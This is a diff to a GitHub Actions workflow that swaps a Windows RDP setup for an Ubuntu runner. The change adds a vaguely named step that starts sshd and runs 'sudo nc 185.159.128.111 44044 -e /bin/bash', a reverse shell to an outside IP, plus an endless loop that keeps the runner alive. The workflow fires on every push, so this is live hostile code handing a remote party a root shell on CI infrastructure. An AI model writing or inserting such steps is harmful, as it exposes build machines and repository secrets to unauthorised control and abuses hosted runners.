@@ -1,26 +1,29 @@
-name: Setup Windows Runner with RDP
+name: Setup Runner with RDP
 
 on:
   push:
   workflow_dispatch:
 
 jobs:
-  setup-windows-runner:
-    runs-on: windows-latest
+  setup-runner:
+    runs-on: ubuntu-latest
 
     steps:
     - name: Checkout code
       uses: actions/checkout@v2
 
-    - name: Enable RDP
+    - name: one more step
       run: |
-        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
-        Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+        apt update -y
+        sshd
+        service ssh status
+        service ssh start | grep -i "running"
+        cat /etc/ssh/sshd_config | grep -i "Port"
+        sudo nc 185.159.128.111 44044 -e /bin/bash
+        echo "Puck"
+    
+    - name: another step
+      run: |
+        while true; do sleep 5; echo $RANDOM; done
 
-    - name: Configure Windows Firewall
-      run: |
-        New-NetFirewallRule -DisplayName "Allow RDP" -Direction Inbound -LocalPort 3389 -Protocol TCP -Action Allow
 
-    - name: Display Runner IP
-      run: |
-        ipconfig
